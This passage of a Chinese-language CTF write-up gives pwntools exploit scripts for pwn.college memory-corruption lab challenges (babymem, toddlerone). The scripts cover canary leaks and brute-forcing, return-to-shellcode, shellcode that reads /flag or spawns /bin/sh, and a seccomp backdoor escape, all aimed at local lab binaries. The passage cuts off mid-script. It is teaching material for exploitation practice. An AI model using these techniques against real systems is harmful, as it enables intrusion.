</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0x13c</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;REPEATaa&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>canary</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>r</span><span class=p>(</span><span class=mi>7</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>leak</span><span class=p>(</span><span class=s1>&#39;canary&#39;</span><span class=p>,</span> <span class=n>canary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>280</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=n>p16</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;pwn.college{&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>[</span><span class=o>-</span><span class=mi>100</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=150>15.0</h3><p>暴力枚举 canary 的每一位，因为服务器每次 <code>fork()</code> 不会重新随机产生 canary（注意保持服务器开启）。而在暴力猜 win 地址倒数第四位时则可以通过重启服务器来重试。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0x1d85</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>24</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=mi>1337</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>guess</span> <span class=o>=</span> <span class=n>b</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s1>&#39;big&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span><span class=p>(</span><span class=n>payload</span> <span class=o>+</span> <span class=n>guess</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Goodbye!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mf>0.5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>res</span> <span class=o>==</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>leak</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;Byte </span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1> of canary&#39;</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>+=</span> <span class=n>guess</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=mi>1337</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=n>p16</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=toddlerone-exploitation-scenarios>toddlerone: Exploitation Scenarios</h2><p>模版同 babymem。</p><h3 id=10-3>1.0</h3><p>注入类似 babyshell 1 的 shellcode，然后 ret2shellcode。</p><p>ORW 方法：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># read(0, address of rip, 1000)</span>
</span></span><span class=line><span class=cl><span class=n>sc1</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>xor rax, rax
</span></span></span><span class=line><span class=cl><span class=s2>xor rdi, rdi
</span></span></span><span class=line><span class=cl><span class=s2>lea rsi, [rip]
</span></span></span><span class=line><span class=cl><span class=s2>mov rdx, 1000  # &lt;- rip
</span></span></span><span class=line><span class=cl><span class=s2>syscall        # sc2 comes after syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># orw</span>
</span></span><span class=line><span class=cl><span class=n>sc2</span> <span class=o>=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>readfile</span><span class=p>(</span><span class=s2>&#34;/flag&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sc1_addr</span> <span class=o>=</span> <span class=mh>0x169e0000</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;stdin.&#39;</span><span class=p>,</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x38</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>sc1_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>nop</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc2</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>拿 shell 方法：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># execve(&#34;/bin/sh\x00&#34;,[&#34;/bin/sh\x00&#34;, &#34;-p\x00\x00&#34;],NULL)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rax, 59                # execve
</span></span></span><span class=line><span class=cl><span class=s2>mov rbx, 0x68732f6e69622f  # &#34;/bin/sh&#34;
</span></span></span><span class=line><span class=cl><span class=s2>push rbx
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp               # rdi -&gt; &#34;/bin/sh&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>push 0x702d                # &#34;-p&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rcx, rsp               # rcx -&gt; &#34;-p&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>push 0
</span></span></span><span class=line><span class=cl><span class=s2>push rcx
</span></span></span><span class=line><span class=cl><span class=s2>push rdi
</span></span></span><span class=line><span class=cl><span class=s2>mov rsi, rsp               # rsi -&gt; [rdi, rcx, 0] on stack -&gt; [&#34;/bin/sh&#34;,&#34;-p&#34;,NULL]
</span></span></span><span class=line><span class=cl><span class=s2>mov rdx, 0                 # NULL
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sc_addr</span> <span class=o>=</span> <span class=mh>0x169e0000</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;stdin.&#39;</span><span class=p>,</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x38</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>sc_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>为调试方便，后续题目使用 babymem 13 的 shellcode。</p><blockquote><p>注：toddlerone 后续所有题目的 <code>x.1</code> 均是在 <code>x.0</code> 基础上要求自己确定偏移量和地址，不再赘述。</p></blockquote><h3 id=20-4>2.0</h3><p>往栈上写 shellcode，然后返回到栈上。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># chmod(&#34;a&#34;, 4)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov al, 0x5a  # chmod
</span></span></span><span class=line><span class=cl><span class=s2>push 0x61     # &#34;a&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp  # rdi -&gt; &#34;a&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>mov sil, 4    # 4 -&gt; 000 000 100
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sc_addr</span> <span class=o>=</span> <span class=mh>0x7fffffffd290</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x78</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>sc_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>2.1 的主要坑点在于，为了确定栈地址需要将环境变量清空：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=p>{})</span>
</span></span></code></pre></td></tr></table></div></div><p>随后再 gdb 确定偏移量即可，最后编写 exp 时也要注意清空环境变量使栈地址固定：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=p>{})</span>
</span></span></code></pre></td></tr></table></div></div><p>为了避免环境变量影响，接下来的题目中均使用这种方式启动进程。</p><blockquote><p>2.0 中如果清空环境变量，则 <code>sc_addr</code> 应设置为 <code>0x7fffffffdcb0</code>。</p></blockquote><h3 id=30-2>3.0</h3><p>第一轮同时泄漏 canary 和 Saved RBP 地址，我们希望通过 Saved RBP 地址推导出栈上的输入地址。</p><p>观察可得：</p><ul><li><p>第一次 challenge 输入地址 - 第二次 challenge 输入地址 = 0xd0</p></li><li><p>Saved RBP 地址 - 输入地址 = 0x10c0</p></li></ul><p>由此可以算出：</p><p>第二次 challenge 输入地址 = 第一次 challenge 输入地址 - 0xd0 = （第一次 Saved RBP 地址 - 0x10c0）- 0xd0</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># chmod(&#34;a&#34;, 4)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov al, 0x5a  # chmod
</span></span></span><span class=line><span class=cl><span class=s2>push 0x61     # &#34;a&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp  # rdi -&gt; &#34;a&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>mov sil, 4    # 4 -&gt; 000 000 100
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;REPEATaa&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x70</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>canary</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>r</span><span class=p>(</span><span class=mi>7</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;canary&#39;</span><span class=p>,</span> <span class=n>canary</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>saved_rbp</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;saved rbp&#39;</span><span class=p>,</span> <span class=n>saved_rbp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chall1_buf</span> <span class=o>=</span> <span class=p>(</span><span class=n>saved_rbp</span> <span class=o>-</span> <span class=mh>0x10c0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chall2_buf</span> <span class=o>=</span> <span class=n>chall1_buf</span> <span class=o>-</span> <span class=mh>0xd0</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;sc addr&#39;</span><span class=p>,</span> <span class=n>chall2_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x78</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>chall2_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=40-2>4.0</h3><p>在 3.0 基础上对 canary 前的一个值有要求。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># chmod(&#34;a&#34;, 4)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov al, 0x5a  # chmod
</span></span></span><span class=line><span class=cl><span class=s2>push 0x61     # &#34;a&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp  # rdi -&gt; &#34;a&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>mov sil, 4    # 4 -&gt; 000 000 100
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>val</span> <span class=o>=</span> <span class=mh>0x68EDE977CB04B929</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;REPEATaa&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x80</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>canary</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>r</span><span class=p>(</span><span class=mi>7</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;canary&#39;</span><span class=p>,</span> <span class=n>canary</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>saved_rbp</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;saved rbp&#39;</span><span class=p>,</span> <span class=n>saved_rbp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chall1_buf</span> <span class=o>=</span> <span class=p>(</span><span class=n>saved_rbp</span> <span class=o>-</span> <span class=mh>0x10d0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;chall1 buf&#39;</span><span class=p>,</span> <span class=n>chall1_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chall2_buf</span> <span class=o>=</span> <span class=n>chall1_buf</span> <span class=o>-</span> <span class=mh>0xe0</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;sc addr&#39;</span><span class=p>,</span> <span class=n>chall2_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>val</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>chall2_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=50-2>5.0</h3><p>在 4.0 的基础上隔开了 canary 和 Saved RBP，可以用 REPEAT 两轮分两次泄漏。还有一个 seccomp 沙箱，但是可以通过程序中的后门逃逸，只要让栈上的一个值为特定值即可。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># chmod(&#34;a&#34;, 4)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov al, 0x5a  # chmod
</span></span></span><span class=line><span class=cl><span class=s2>push 0x61     # &#34;a&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp  # rdi -&gt; &#34;a&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>mov sil, 4    # 4 -&gt; 000 000 100
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>val</span> <span class=o>=</span> <span class=mh>0x848FFD3CEC0476D2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;REPEATaa&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x20</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>canary</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>r</span><span class=p>(</span><span class=mi>7</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;canary&#39;</span><span class=p>,</span> <span class=n>canary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
